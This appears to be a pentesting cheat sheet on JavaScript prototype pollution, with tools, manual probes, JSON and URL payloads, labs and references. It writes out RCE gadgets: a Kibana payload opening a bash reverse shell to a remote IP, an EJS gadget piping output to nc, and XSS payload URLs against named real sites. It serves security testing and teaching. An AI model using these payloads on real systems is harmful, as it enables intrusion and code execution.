# Prototype Pollution

> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Examples](#examples)
    * [Manual Testing](#manual-testing)
    * [Prototype Pollution via JSON Input](#prototype-pollution-via-json-input)
    * [Prototype Pollution in URL](#prototype-pollution-in-url)
    * [Prototype Pollution Payloads](#prototype-pollution-payloads)
    * [Prototype Pollution Gadgets](#prototype-pollution-gadgets)
* [Labs](#labs)
* [References](#references)


## Tools

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation
* [yuske/silent-spring](https://github.com/yuske/silent-spring) - Prototype Pollution Leads to Remote Code Execution in Node.js
* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Server-Side Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages
* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) - Prototype Pollution and useful Script Gadgets
* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - Burp Suite Extension detectiong Prototype Pollution vulnerabilities
* [msrkp/PPScan](https://github.com/msrkp/PPScan) - Client Side Prototype Pollution Scanner 


## Methodology

In JavaScript, prototypes are what allow objects to inherit features from other objects. If an attacker is able to add or modify properties of `Object.prototype`, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.

```js
var myDog = new Dog();
```

```js
// Points to the function "Dog"
myDog.constructor;
```

```js
// Points to the class definition of "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```


### Examples

* Imagine that an application uses an object to maintain configuration settings, like this:
    ```js
    let config = {
        isAdmin: false
    };
    ```
* An attacker might be able to add an `isAdmin` property to `Object.prototype`, like this:
    ```js
    Object.prototype.isAdmin = true;
    ```


### Manual Testing

* ExpressJS: `{ "__proto__":{"parameterLimit":1}}` + 2 parameters in GET request, at least 1 must be reflected in the response.
* ExpressJS: `{ "__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
* ExpressJS: `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
* Change the padding of a JSON response: `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, the server should return `{"foo": "bar"}`
* Modify CORS header responses: `{ "__proto__":{"exposedHeaders":["foo"]}}`, the server should return the header `Access-Control-Expose-Headers`.
* Change the status code: `{ "__proto__":{"status":510}}`


### Prototype Pollution via JSON Input

You can access the prototype of any object via the magic property `__proto__`. 
The `JSON.parse()` function in JavaScript is used to parse a JSON string and convert it into a JavaScript object. Typically it is a sink function where prototype pollution can happen.


```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

Asynchronous payload for NodeJS.

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

Polluting the prototype via the `constructor` property instead.

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```


### Prototype Pollution in URL

Example of Prototype Pollution payloads found in the wild.

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```


### Prototype Pollution Exploitation

Depending if the prototype pollution is executed client (CSPP) or server side (SSPP), the impact will vary.

* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
    ```js
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    ```
* Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
    ```js
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```
* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)
* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* Denial of Service


### Prototype Pollution Payloads

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```


### Prototype Pollution Gadgets

A "gadget" in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. When we talk about a "prototype pollution gadget," we're referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.

Either create your own gadget using part of the source with [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), or try to use already discovered gadgets [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) / [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).


## Labs

* [YesWeHack Dojo - Prototype Pollution](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)
* [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)


## References

- [A Pentester's Guide to Prototype Pollution Attacks - Harsh Bothra - January 2, 2023](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
- [A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild - s1r1us - September 28, 2021](https://blog.s1r1us.ninja/research/PP)
- [Detecting Server-Side Prototype Pollution - Daniel Thatcher - February 15, 2023](https://www.intruder.io/research/server-side-prototype-pollution)
- [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) - Michał Bentkowski - October 30, 2019](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [Keynote | Server Side Prototype Pollution: Blackbox Detection Without The DoS - Gareth Heyes - March 27, 2023](https://youtu.be/LD-KcuKM_0M)
- [NodeJS - \_\_proto\_\_ & prototype Pollution - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [Prototype Pollution - PortSwigger - November 10, 2022](https://portswigger.net/web-security/prototype-pollution)
- [Prototype pollution - Snyk - August 19, 2023](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
- [Prototype pollution and bypassing client-side HTML sanitizers - Michał Bentkowski - August 18, 2020](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [Prototype Pollution and Where to Find Them - BitK & SakiiR - August 14, 2023](https://youtu.be/mwpH9DF_RDA)
- [Prototype Pollution Attacks in NodeJS - Olivier Arteau - May 16, 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- [Prototype Pollution Attacks in NodeJS applications - Olivier Arteau - October 3, 2018](https://youtu.be/LUsiFV3dsK8)
- [Prototype Pollution Leads to RCE: Gadgets Everywhere - Mikhail Shcherbakov - September 29, 2023](https://youtu.be/v5dq80S1WF4)
- [Server side prototype pollution, how to detect and exploit - BitK - February 18, 2023](http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
- [Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes - February 15, 2023](https://portswigger.net/research/server-side-prototype-pollution)